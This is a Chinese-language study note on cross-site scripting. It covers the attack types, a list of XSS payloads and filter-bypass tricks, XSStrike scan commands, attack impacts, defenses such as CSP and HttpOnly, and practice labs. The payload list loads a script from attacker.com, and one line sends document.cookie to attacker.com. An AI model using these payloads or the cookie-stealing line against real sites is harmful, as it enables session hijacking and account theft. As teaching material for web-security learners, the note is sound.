# XSS（跨站脚本攻击）

> 标签：#Web安全 #XSS #OWASP

## 原理

攻击者在网页中注入恶意 JavaScript 代码，当其他用户访问时执行。

## 三种类型

| 类型 | 说明 | 危害 |
|------|------|------|
| **反射型** | 非持久化，URL 参数触发 | 钓鱼链接 |
| **存储型** | 持久化存入数据库 | 最危险，攻击所有访问者 |
| **DOM 型** | 不经过服务器，前端 JS 处理 | 绕过 WAF |

## 常用 Payload

```html
<!-- 基本弹窗 -->
<script>alert(1)</script>

<!-- 外部脚本 -->
<script src="http://attacker.com/xss.js"></script>

<!-- img 事件 -->
<img src=x onerror="alert(1)">
<img src=x onload="alert(1)">

<!-- SVG -->
<svg onload="alert(1)">

<!-- body 事件 -->
<body onload="alert(1)">
<body onerror="alert(1)">

<!-- input 事件 -->
<input onfocus="alert(1)" autofocus>

<!-- 伪协议 -->
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">link</a>

<!-- 绕过关键字过滤 -->
<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
<scr_ipt>alert(1)</scr_ipt>
<ScRiPt>alert(1)</ScRiPt>
```

## 常见绕过技巧

- 大小写混淆：`<ScRiPt>`
- HTML 编码：`&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;`
- URL 编码：`<` → `%3C`
- 空字节：`%00<script>`、`<script%00>`
- 注释分隔：`<!--<script>--><script>alert(1)//--></script>`

## 自动化工具

### XSStrike
```bash
# 扫描 URL（自动检测 XSS）
xsstrike -u "http://target.com/?q=test"

# POST 请求
xsstrike -u "http://target.com/search" --data "q=test"

# 爬取 + 检测
xsstrike -u "http://target.com/" --crawl
```

### Burp Suite
- **Intruder** — 批量 Payload 测试
- **DOM Invader** — 浏览器内置，检测 DOM XSS

## XSS 危害

- 🔴 **窃取 Cookie**：`document.location='http://attacker.com/?c='+document.cookie`
- 🔴 **键盘记录**：监听用户输入
- 🔴 **钓鱼弹窗**：伪造登录框
- 🔴 **会话劫持**：冒充用户操作
- 🟡 **蠕虫传播**：在社交网站自动传播
- 🟡 **恶意重定向**：跳转到恶意网站

## 防御方法

- ✅ **输入过滤**（HTML 编码实体）
- ✅ **输出编码**（Context-aware）
- ✅ **CSP（内容安全策略）**
- ✅ **HttpOnly**（Cookie 设置，禁止 JS 读取）
- ✅ **`WAF`**
- ❌ **仅靠黑名单过滤**

## CSP 示例

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxxx'; object-src 'none'
```

## 靶场练习

- DVWA — XSS（反射/存储）
- Pikachu — XSS
- alert(1) to win
- prompt(1) to win
